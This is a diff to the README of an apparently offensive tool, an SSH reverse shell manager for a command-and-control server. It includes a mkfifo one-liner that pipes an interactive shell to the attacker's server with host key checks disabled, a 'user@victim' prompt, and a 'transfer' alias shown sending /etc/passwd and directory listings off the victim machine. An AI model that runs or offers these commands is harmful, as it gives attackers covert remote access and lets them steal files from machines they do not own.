@@ -13,7 +13,7 @@ Script to setup a SSH reverse shell manager on a C2 server
 
 2. Connect from the client
     ```bash
-    mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i /home/user/.ssh/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@server > /tmp/f; rm /tmp/f
+    mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i ~/.ssh/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@server > /tmp/f; rm /tmp/f
     ```
 3. Connect from the server
     ```bash
@@ -21,17 +21,26 @@ Script to setup a SSH reverse shell manager on a C2 server
     ```
     ```
     Connecting to 8.8.8.8_18000...
-    Upgrade to a full TTY:
-    * Launch a ptty:
-      $ python -c 'import pty; pty.spawn("/bin/bash")'
-      or
-      $ script
-    * Background the process (Ctrl+z)
-    * Setup the environment:
-      $ stty raw -echo
-      $ fg
-      $ reset; export SHELL=bash; export TERM=xterm-256color; stty rows 27 columns 204
-    Connection to 127.0.0.1 18000 port [tcp/*] succeeded!
-    sh: no job control in this shell
-    sh-3.2$
+    user@victim:~$
     ```
+
+## Aliases
+When connecting with a full TTY SSHReverseShell injects aliases to help performing common commands
+
+### transfer
+The transfer alias allows secure file transfer over SSH.
+
+Examples:
+```bash
+user@victim:~$ transfer /etc/passwd
+Warning: Permanently added 'xxx.xxx.xxx.xxx' (ECDSA) to the list of known hosts.
+File transfer mode saving to yyy.yyy.yyy.yyy/_etc_passwd
+Received 2429 bytes
+```
+
+```bash
+user@victim:~$ find . | transfer
+Warning: Permanently added 'xxx.xxx.xxx.xxx' (ECDSA) to the list of known hosts.
+File transfer mode saving to yyy.yyy.yyy.yyy/output_1548231431
+Received 736 bytes
+```
